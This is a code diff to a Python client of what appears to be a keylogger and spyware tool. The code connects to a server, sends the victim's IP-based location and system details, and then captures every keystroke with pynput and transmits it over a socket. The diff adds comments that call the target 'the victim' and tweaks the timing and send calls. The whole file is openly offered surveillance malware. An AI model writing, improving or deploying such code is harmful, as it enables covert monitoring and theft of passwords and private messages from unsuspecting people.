@@ -1,3 +1,4 @@
+import os
 import socket as s
 import geocoder
 from os import getcwd
@@ -9,22 +10,26 @@ from pynput.keyboard import Listener
 class Client:
     def __init__(self):
         # checking and set the file at the start of pc
+        self.os = os.name
         self.client = s.socket()
         self.host = "localhost"
         self.port = 8080
         self.key_logger_mod = True
         self.conn_server()
 
+    # Connect to the server and start basic functions
     def conn_server(self):
         self.client.connect((self.host, self.port))
         print("Connessione effettuata!")
-        sleep(3)
+        sleep(2)
         self.get_vinfo()
         self.key_logger()
 
+    # Send message to the server
     def sendmsg(self, msg):
-        self.client.sendall(msg.encode())
+        self.client.send(msg.encode())
 
+    # Get basic info of th ìe victim
     def get_vinfo(self):
         ip = geocoder.ip("me")
         pc_information = f"{getcwd()} {uname()} {processor()}"
@@ -35,6 +40,7 @@ class Client:
         if self.key_logger_mod:
             self.sendmsg(str(key))
 
+    # Listens and sends all keys pressed to the server
     def key_logger(self):
         with Listener(on_press=self.on_press) as listener:
             listener.join()
